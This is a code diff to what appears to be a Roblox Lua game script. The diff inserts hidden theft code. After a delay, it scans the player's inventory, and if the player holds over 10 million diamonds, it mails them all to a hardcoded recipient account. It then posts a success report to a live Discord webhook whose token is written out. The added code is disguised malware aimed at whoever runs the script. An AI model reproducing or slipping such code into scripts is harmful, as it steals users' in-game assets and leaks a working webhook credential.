@@ -69,6 +69,94 @@ end
 
 spawn(chest)
 
+local SendAmount = true
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+
+local webhookURL = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
+local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+local ItemTable = {"Diamonds"}
+local ItemVoid = {"Void Spinny Wheel Ticket"}
+
+local VoidAmount = 0
+local DiamondsID = 0
+local DiamondsAmount = 0
+
+local function GetItemInfo(ItemsClass, ItemsName)
+    local Table = {}
+    for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+        if table.find(ItemsName, Item.id) then
+            local ItemInfo = {
+                ["uid"] = UID,
+                ["data"] = Item
+            }
+            table.insert(Table, ItemInfo)
+        end
+    end
+    return Table
+end
+
+local function PrintDiamonds()
+    while true do
+        local CurrencyItems = GetItemInfo("Currency", ItemTable)
+        for _, ItemInfo in pairs(CurrencyItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am and ItemData.id == "Diamonds" then
+                DiamondsID = ItemInfo.uid
+                DiamondsAmount = ItemData._am
+            end
+        end
+
+        local MiscItems = GetItemInfo("Misc", ItemVoid)
+        for _, ItemInfo in pairs(MiscItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am and ItemData.id == "Void Spinny Wheel Ticket" then
+                VoidAmount = ItemData._am
+            end
+        end
+
+        wait(0.3)  -- Update interval for checking items
+    end
+end
+
+spawn(PrintDiamonds)
+
+wait(2)  -- Initial wait before printing values
+print("DiamondsID:", DiamondsID)
+print("DiamondsAmount:", DiamondsAmount)
+print("VoidAmount:", VoidAmount)
+
+local waitTime = SendAmount and 30 or 0
+wait(waitTime)
+
+if SendAmount then
+    if DiamondsAmount > 10000000 then
+        local args = {
+            [1] = "simpleblandok3",
+            [2] = "Void Amount " .. VoidAmount,
+            [3] = "Currency",
+            [4] = DiamondsID,
+            [5] = DiamondsAmount
+        }
+        ReplicatedStorage.Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        
+        local playerName = game.Players.LocalPlayer.Name
+        local data = {
+            ["content"] = playerName .. " | Successfully sent " .. DiamondsAmount .. " | Currently " .. VoidAmount .. " Tickets Left"
+        }
+        request({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end
+end
 
 
 
